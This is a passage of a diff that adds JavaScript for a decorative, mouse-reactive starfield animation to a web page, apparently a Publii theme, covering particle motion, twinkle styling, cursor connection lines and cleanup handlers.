+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
